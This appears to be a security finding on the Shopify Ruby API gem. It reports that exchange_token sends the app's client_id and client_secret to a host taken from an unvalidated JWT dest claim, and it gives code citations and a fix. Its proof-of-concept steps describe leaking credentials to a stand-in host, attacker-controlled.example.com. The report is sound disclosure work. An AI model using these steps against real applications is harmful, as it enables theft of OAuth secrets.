### Title
Missing shop-domain validation in `TokenExchange.exchange_token` sends `client_secret` to an unvalidated host derived from the JWT `dest` claim - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` takes the shop host to which it sends the app's `client_id`/`client_secret` directly from the session token's `dest` claim, without ever validating that host against `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS`. This is inconsistent with the sibling method `migrate_to_expiring_token` in the same file, which explicitly calls `Utils::ShopValidator.sanitize!(shop)` before using it to build the request session/host.

### Finding Description
In `exchange_token`, the shop used to build the outbound HTTP request is taken straight from the decoded JWT payload: [1](#0-0) 

`jwt_payload.shop` is simply `@dest.gsub("https://", "")` with no allow-list check: [2](#0-1) 

`JwtPayload#initialize` only verifies the signature (against `Context.api_secret_key`/`old_api_secret_key`) and that `aud == Context.api_key`; it never checks that `iss`/`dest` is a trusted Shopify domain (`myshopify.com`, `myshopify.io`, `spin.dev`, `shop.dev`, etc.) the way `Utils::ShopValidator` does elsewhere: [3](#0-2) 

That unsanitized `dest_shop` is then used to build a `Session`, whose `shop` attribute directly determines the request host in `HttpClient`: [4](#0-3) 

...to which the request body — containing `client_id` and `client_secret` — is POSTed: [5](#0-4) 

By contrast, the near-identical `migrate_to_expiring_token` method in the same module does bind the host to the trusted-domain allow-list before sending the same credentials: [6](#0-5) 

The binding that should hold is: `host_that_receives(client_secret) == host_validated_by(ShopValidator.TRUSTED_SHOPIFY_DOMAINS)`. In `exchange_token` this equality is never enforced — the JWT's `dest` claim is trusted for host-selection purposes without being bound to the trusted-domain check, even though the same file demonstrates that binding is expected practice elsewhere.

### Impact Explanation
If `dest_shop` can carry an untrusted or attacker-influenced value (any code path where an app passes a session token whose `dest` claim was not produced through Shopify's canonical, `myshopify.com`-scoped issuance — e.g., a custom/embedded flow, misconfigured `iss`/`dest` in a non-standard hosting setup, or any host application logic that constructs/relays token claims), the gem will unconditionally POST the app's `client_id` and `client_secret` to that host. This is SSRF carrying the app's own OAuth credentials to an attacker-influenced destination, which matches the in-scope "High - SSRF with the app's credentials" impact category.

### Likelihood Explanation
Low-to-moderate. Because the JWT is verified with `JWT.decode(token, api_secret_key, true, ...)`, a value in `dest` can only be attacker-chosen if an app either (a) forwards a session token whose `dest` was set by something other than genuine Shopify token issuance, or (b) exists in a dev/spin environment where domain conventions are looser. The library provides no defense-in-depth check here even though it does so in the parallel `migrate_to_expiring_token` method, so the gem itself does not guarantee the invariant that credentials only reach a myshopify-trusted host.

### Recommendation
In `TokenExchange.exchange_token`, validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` (as already done in `migrate_to_expiring_token`) before constructing `shop_session` and issuing the request, ensuring the host that receives `client_id`/`client_secret` is always bound to the trusted Shopify domain list.

### Proof of Concept
1. Obtain/construct a session token whose `dest` claim is `https://attacker-controlled.example.com` (any path where the host application passes a token to `exchange_token` without itself re-validating `dest` against Shopify's domain conventions, since the gem does not perform this check).
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload.new` accepts the token (signature and `aud` match), returning `shop == "attacker-controlled.example.com"`.
4. `HttpClient.new(session: Session.new(shop: "attacker-controlled.example.com"), base_path: "/admin/oauth")` builds `@base_uri = "https://attacker-controlled.example.com"`.
5. The library POSTs `{ client_id, client_secret, grant_type, subject_token, ... }` to `https://attacker-controlled.example.com/admin/oauth/access_token`, leaking the app's `client_secret` to the untrusted host — contrast with `migrate_to_expiring_token`, which would have rejected an untrusted `shop` via `Utils::ShopValidator.sanitize!`.

### Citations

**File:** lib/shopify_api/auth/token_exchange.rb (L40-51)
```ruby
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
```

**File:** lib/shopify_api/auth/token_exchange.rb (L52-74)
```ruby
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-115)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: non_expiring_offline_token,
            subject_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            requested_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            expiring: "1",
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L23-45)
```ruby
      sig { params(token: String).void }
      def initialize(token)
        payload_hash = begin
          decode_token(token, Context.api_secret_key)
        rescue ShopifyAPI::Errors::InvalidJwtTokenError
          raise unless Context.old_api_secret_key

          decode_token(token, T.must(Context.old_api_secret_key))
        end

        @iss = T.let(payload_hash["iss"], String)
        @dest = T.let(payload_hash["dest"], String)
        @aud = T.let(payload_hash["aud"], String)
        @sub = T.let(payload_hash["sub"], T.nilable(String))
        @exp = T.let(payload_hash["exp"], Integer)
        @nbf = T.let(payload_hash["nbf"], Integer)
        @iat = T.let(payload_hash["iat"], Integer)
        @jti = T.let(payload_hash["jti"], String)
        @sid = T.let(payload_hash["sid"], T.nilable(String))

        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/clients/http_client.rb (L11-19)
```ruby
      sig { params(base_path: String, session: T.nilable(Auth::Session)).void }
      def initialize(base_path:, session: nil)
        session ||= Context.active_session
        raise Errors::NoActiveSessionError, "No passed or active session" unless session

        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```
